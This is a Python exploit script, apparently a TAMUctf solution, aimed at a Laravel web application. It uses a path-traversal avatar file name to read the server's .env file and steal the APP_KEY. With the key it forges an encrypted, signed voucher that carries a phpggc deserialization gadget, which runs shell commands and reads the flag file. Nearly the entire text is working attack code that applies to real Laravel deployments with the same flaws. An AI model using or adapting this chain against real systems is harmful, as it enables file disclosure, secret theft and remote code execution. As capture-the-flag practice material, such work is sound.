import requests
import re
import subprocess
import base64, json, os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hmac, hashlib

url = "https://b6f18396-06fb-46db-bbce-3fa4ff44b2a7.tamuctf.com"
s = requests.Session()

creds = {
    'username': 'hacked',
    'password': 'hacked',
    'password2': 'hacked'
}

# login
def get_token(endpoint):
    res = s.get(f'{url}/{endpoint}')

    return re.findall(r'"_token" value="(.+)" auto', res.text)[0].strip() 

res = s.post(f'{url}/register', data={
    **creds,
    '_token': get_token('register')
})

res = s.post(f'{url}/login', data={
    **creds,
    '_token': get_token('login')
})

if "welcome" in res.text.lower():
    print("> Logged in")

# lfi
def lfi(file):
    PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\nIDATx\x9cc`\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"

    res = s.post(f'{url}/account/avatar', files = {
        "avatar": (
            f"../../../../../../../../../../{file}",
            PNG,
            "image/png",
        )
    }, data={
        '_token': get_token('account')
    })

    res = s.get(f'{url}/avatar')
    return res.content

app_key = re.findall(r'APP_KEY=base64:(.+)', lfi("/var/www/.env").decode())[0].strip()
print("App key:", app_key)

# rce
def get_voucher(cmd):
    key = base64.b64decode(app_key)
    iv = os.urandom(16)

    payload = subprocess.check_output(["php", "./phpggc/phpggc", "Laravel/RCE9", "system", cmd])

    cipher = AES.new(key, AES.MODE_CBC, iv)
    value = base64.b64encode(cipher.encrypt(pad(payload, 16))).decode()
    iv_b64 = base64.b64encode(iv).decode()

    mac = hmac.new(key, (iv_b64 + value).encode(), hashlib.sha256).hexdigest()

    payload = base64.b64encode(json.dumps({
        "iv": iv_b64,
        "value": value,
        "mac": mac,
        "tag": ""
    }).encode()).decode()

    return payload

def rce(cmd):
    res = s.post(f"{url}/vouchers/redeem", data={
        'voucher': get_voucher(cmd),
        '_token': get_token('vouchers')
    })

    return res.text

flag_file = re.findall(r'(.+-flag.txt)', rce('ls /'))[0]
print("Flag path:", flag_file)

leak = rce(f'cat /{flag_file}')

flag = re.findall(r'(gigem{.+})', leak)[0]
print("Flag:", flag)